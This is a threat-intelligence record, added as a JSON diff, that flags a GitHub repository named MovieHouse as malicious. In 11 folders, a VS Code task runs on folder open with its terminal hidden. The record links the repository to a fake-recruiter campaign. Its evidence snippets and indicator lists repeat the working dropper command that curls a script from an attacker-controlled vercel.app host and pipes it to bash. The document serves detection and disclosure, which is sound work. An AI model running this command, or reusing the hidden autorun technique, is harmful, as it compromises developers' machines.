@@ -1,0 +1,196 @@
+{
+  "finding": {
+    "key": "repository:noors-code/moviehouse",
+    "kind": "repository",
+    "id": "noors-code/moviehouse",
+    "url": "https://github.com/noors-code/MovieHouse",
+    "registry": "github",
+    "owner": "noors-code",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0; styles/.vscode/tasks.json:0; public/.vscode/tasks.json:0; public/data/.vscode/tasks.json:0; pages/.vscode/tasks.json:0; pages/movies/.vscode/tasks.json:0; pages/movies/[id]/.vscode/tasks.json:0; pages/help/.vscode/tasks.json:0; pages/genres/.vscode/tasks.json:0; pages/api/.vscode/tasks.json:0; pages/api/directors/.vscode/tasks.json:0",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "settings/linux?flag=; settings/win?flag=; folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260928T024937Z",
+    "last_seen": "hunt-20260928T024937Z",
+    "evidence_file": "repositories/noors-code_moviehouse.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "styles/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "public/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "public/data/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/movies/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/movies/[id]/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/help/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/genres/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/api/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/api/directors/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "styles/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "public/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "public/data/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/movies/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/movies/[id]/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/help/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "pages/genres/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    }
+  ],
+  "commit_sha": "2c255a15c9fa306a51cc0c851d2f5745fdf23e3b",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/noors-code/moviehouse",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. The same dropper is planted in 11 separate directories in this repository, so it runs whichever of them the victim opens: .vscode/tasks.json, pages/.vscode/tasks.json, pages/api/.vscode/tasks.json, pages/api/directors/.vscode/tasks.json, pages/genres/.vscode/tasks.json, pages/help/.vscode/tasks.json, pages/movies/.vscode/tasks.json, pages/movies/[id]/.vscode/tasks.json, public/.vscode/tasks.json, public/data/.vscode/tasks.json, styles/.vscode/tasks.json. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: settings/linux?flag=; settings/win?flag=; folderOpen curl filename:tasks.json. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: default-configuration.vercel.app. This repository is one of 86 that Git Warden has confirmed as campaign GW-C-498a0aeb, which all deliver the same dropper URL shape (settings/{os}?flag=). The campaign spans 58 GitHub accounts. The other confirmed repositories are: https://github.com/123babayaga/zenithive_angular, https://github.com/adan-asim/e-commerce-admin-app-backend, https://github.com/aidevshakil055/achillcomfort_ai_repo, https://github.com/allzone-technologies/canteen-pwa, https://github.com/anshuman-jha/toku_assestment, https://github.com/arif1101/restaurant-management-server, https://github.com/arnoldesquivel/best-city436-poc, https://github.com/asad-ghafoor/python-setup, https://github.com/bhoomikamehtastartbit/reactchakraui, https://github.com/crazydev13/school-management, https://github.com/dawit212119/anbessa, https://github.com/dawit212119/bus-admin, https://github.com/dawit212119/eaglepoint-ai, https://github.com/dawit212119/ecommerce-backend, https://github.com/dawit212119/go, https://github.com/dawit212119/nextebook, https://github.com/dawit212119/wetruck, https://github.com/dishankchauhan/tech_test_pro-assignment, https://github.com/djeday123/test_repo1, https://github.com/dylanlittle/team-moshpit-project, https://github.com/eastmade/web3project-momo-token, https://github.com/eferos93/test4, https://github.com/emandeveloper/datascience, https://github.com/emigimenezj/solice2021-school-management-system, https://github.com/findusman/pos_backend, https://github.com/gauravraisharma/ticketting-system, https://github.com/hakeemsyd/fastapi-rag, https://github.com/haroldcalvo/workshop, https://github.com/helidonashabani/student-management, https://github.com/huncholane/defi_property, and 55 more. Across the campaign the payload is served from 18 distinct hosts: 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app, vscode-extension-260120.vercel.ap, vscode-extension-260120.vercel.app, vscode-extensions-bootstrap.vercel.app, vscode-helper-132.vercel.app, vscode-helper171-ruby.vercel.app, vscode-helper171.vercel.app, vscode-load-config.vercel.app, vscode-settings-bootstrap.vercel.app, vscode-settings-config-md.vercel.app, and 3 more. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape. (2) Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (11 files).",
+    "publisher": "noors-code",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/styles/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/public/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/public/data/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/movies/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/movies/[id]/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/help/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/genres/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/api/.vscode/tasks.json\nhttps://github.com/noors-code/moviehouse/blob/2c255a15c9fa306a51cc0c851d2f5745fdf23e3b/pages/api/directors/.vscode/tasks.json",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-09-28T02:49:37Z",
+    "last_seen": "2026-09-28T02:49:37Z"
+  }
+}
